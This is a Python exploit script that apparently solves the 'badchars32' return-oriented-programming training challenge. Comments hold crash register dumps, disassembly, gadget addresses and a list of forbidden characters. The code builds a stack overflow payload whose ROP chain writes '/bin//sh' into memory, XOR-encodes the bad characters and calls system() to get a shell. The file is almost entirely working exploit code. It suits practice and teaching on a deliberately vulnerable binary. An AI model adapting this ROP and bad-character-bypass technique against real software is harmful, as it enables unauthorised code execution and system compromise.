#!/usr/bin/python
import struct
from struct import pack
import re


# ==================================================
# Usages:  (python exp.py; cat) | ./badchars32 
# =================================================

#+ ------------------------------------------------------------------ +
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |     _____ ___________   _____                                  | =
#= |    /  ___/  ___| ___ \ |  __ \                                 | =
#= |    \ `--.\ `--.| |_/ / | |  \/_ __ ___  _   _ _ __             | =
#= |     `--. \`--. \ ___ \ | | __| '__/ _ \| | | | '_ \            | =
#= |    /\__/ /\__/ / |_/ / | |_\ \ | | (_) | |_| | |_) |           | =
#= |    \____/\____/\____/   \____/_|  \___/ \__,_| .__/            | =
#= |                                              | |               | =
#= |                                              |_|               | =
#= +----------------------------------------------------------------+ =
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |                   surajsinghbisht054@gmail.com                 | =
#= |                      www.bitforestinfo.com                     | =
#= |                                                                | =
#= |                  Try Smart, Try Hard & Don't Cheat             | =
#= +----------------------------------------------------------------+ =
#+ ------------------------------------------------------------------ +



# Tried pattern
pattern = 'AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqA'
#  [Output]
# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#    eax 0x0         eax
#   ebx 0x0         eax
#   ecx 0x20        ecx ascii
#   edx 0x9b19158   edx heap R W 0x0 -->  eax
#   esi 0xf7eea000  (/lib/i386-linux-gnu/libc-2.27.so) esi library R W 0x1d7d6c
#   edi 0x0         eax
#   esp 0xffe89840  esp stack R W 0x43434343 -->  ascii
#   ebp 0x41414141  ebp ascii
#   eip 0x42424242  eip ascii
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# +++++++++++ [Useful Functions Calls] +++++++++++++++++++++
# 007 0x000004e0 0x080484e0 GLOBAL   FUNC   16 imp.system
# 009 0x000004f0 0x080484f0 GLOBAL   FUNC   16 imp.exit
# +++++++++++ [Disassembly] +++++++++++++++++++++++++++++++
#[0x42424242]> pdf @ sym.usefulFunction 
#(fcn) sym.usefulFunction 25
#   sym.usefulFunction ();
#           0x080487a9      55             push ebp
#           0x080487aa      89e5           ebp = esp
#           0x080487ac      83ec08         esp -= 8
#           0x080487af      83ec0c         esp -= 0xc
#           0x080487b2      6873890408     push str.bin_ls             ; 0x8048973 ; "/bin/ls"
#           0x080487b7      e824fdffff     sym.imp.system ()           ; int system(const char *string)
#           0x080487bc      83c410         esp += 0x10
#           0x080487bf      90             
#           0x080487c0      c9             leave 
#           0x080487c1      c3             return



# [Gadgets]
g1 = 0x080488fb # pop ebp ; ret
g2 = 0x08048461 # pop ebx ; ret
g3 = 0x08048897 # pop ecx ; ret
g4 = 0x0804889a # pop edi ; ret
g5 = 0x08048899 # pop esi ; pop edi ; ret
g6 = 0x08048893 # mov dword ptr [edi], esi ; ret
g7 = 0x08048890 # xor byte ptr [ebx], cl ; ret

# 0x08048896 : pop ebx ; pop ecx ; ret
# 0x080488f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080488fa : pop edi ; pop ebp ; ret
# 0x080488f9 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048899 : pop esi ; pop edi ; ret
# 0x08048893 : mov dword ptr [edi], esi ; ret
# 0x080487fc : mov eax, dword ptr [ebp - 4] ; leave ; ret
# 0x0804862a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
# 0x08048570 : mov ebx, dword ptr [esp] ; ret


# [BAD Chars]
# b i c / <space> f n s


# ++++++++++++++++++++++[ Useful Data ]++++++++++++++++++++++++++
gg1 = 0x080487b2
adr1 = 0x0804a234 # <--- Random Free Space in .bss Section 
adr2 = 0x080484e0 # GLOBAL   FUNC   16 imp.system
adr3 = 0x080484f0 # GLOBAL   FUNC   16 imp.exit

badchar =  'bic/ fns'
XOR = 2


# XOR Function
def xor(addr):
	pay = ''
	pay += pack('I', g2)
	pay += pack('I', addr)
	pay += pack('I', g7)
	return pay

# Writing Function
def writevalue(addr, cmd, badch):
	s = ''
	adrlist = []
	tmpaddr = addr

	for n,i in enumerate(cmd):
		if i in badch:
			s += chr(ord(i) ^ XOR)
			adrlist.append(addr+n)
			#print '[+] Found Badchar : ',i
			#print '[+] Now String : ', s
		else:
			s += i
	rop = ''
	for i in re.findall('....', s):
		rop += pack('I', g5)
		rop += i
		rop += pack('I', tmpaddr)
		tmpaddr += 4
		rop += pack('I', g6)

	rop += pack('I', g3)
	rop += '\x02'*4

	for i in adrlist:
		rop += xor(i)
	return  rop



pay = ''
pay += 'A'*40
pay += 'BBBB'  # EBP
# WriteValue = Automatically Write Data In our Pointed Addr [AUTO XOR Include To Bypass Badchar limitation] 
pay += writevalue(adr1, '/bin//sh', badchar)  # EIP
pay += pack('I', adr2)
pay += pack('I', adr3)
pay += pack('I', adr1)

print pay
